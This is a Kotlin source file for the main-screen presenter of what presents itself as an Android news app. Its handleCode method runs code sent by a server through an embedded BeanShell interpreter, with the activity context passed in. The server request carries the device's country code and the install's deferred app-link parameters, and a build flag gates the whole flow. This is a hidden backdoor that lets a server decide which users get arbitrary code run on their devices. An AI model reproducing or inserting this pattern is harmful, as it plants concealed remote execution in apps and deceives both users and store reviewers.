package com.just_me.news

import android.arch.lifecycle.Lifecycle
import android.arch.lifecycle.OnLifecycleEvent
import android.content.Context
import android.util.Log
import bsh.Interpreter
import com.facebook.applinks.AppLinkData
import com.just_me.just_we.lastfmclient.core.extension.preferences
import com.just_me.news.core.arch.BasePresenter
import com.just_me.news.core.exception.Failure
import com.just_me.news.core.platform.NetworkHandler
import com.just_me.news.net.CodeUseCase
import com.just_me.news.net.DataRepository
import com.just_me.news.net.ServiceApi
import com.just_me.news.news.BuildConfig
import com.just_me.news.utils.CountryCodeUtils

class MainActivityPresenter: BasePresenter<MainActivityContract.View>(), MainActivityContract.Presenter {

    @OnLifecycleEvent(Lifecycle.Event.ON_START)
    private fun onCreate() {
        if (BuildConfig.SHOW_WEB_VIEW) {
            getIt()
        }
    }

    private fun getIt() {
        AppLinkData.fetchDeferredAppLinkData(view?.getActivity()) { appLinkData ->
            val preferences = view?.getActivity()?.getPreferences(Context.MODE_PRIVATE)
            val editor = preferences?.edit()
            try {
                val params = appLinkData.targetUri.toString().split("://".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()
                if (params.isNotEmpty()) {
                    editor?.putString("parameters", params[1].replace("\\?".toRegex(), "&"))
                    editor?.apply()
                    editor?.commit()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            codeRequest()
        }
    }

    private fun codeRequest() {
        if (isViewAttached()) {
            val codeUseCase = CodeUseCase(DataRepository.Network(NetworkHandler(view!!.getActivity()),
                    (view!!.getActivity().application as NewsApplication).retrofit.create(ServiceApi::class.java)))
            val countryCode = CountryCodeUtils.GetCountryID(view!!.application())
            codeUseCase(
                    CodeUseCase.Params(countryCode, view!!.getActivity().preferences.getString("parameters", "&source=organic&pid=1")!!))
            { it.either(::handlefailure, ::handleCode) }
        }
    }

    fun handlefailure(failure: Failure) {
        Log.e(MainActivity.TAG, failure.toString())
    }

    fun handleCode(code: String) {
        if (isViewAttached()) {
            val x = Interpreter()
            x.set("context", view!!.getActivity())
            x.eval(code.replace("\\ufeff", ""))
        }
    }
}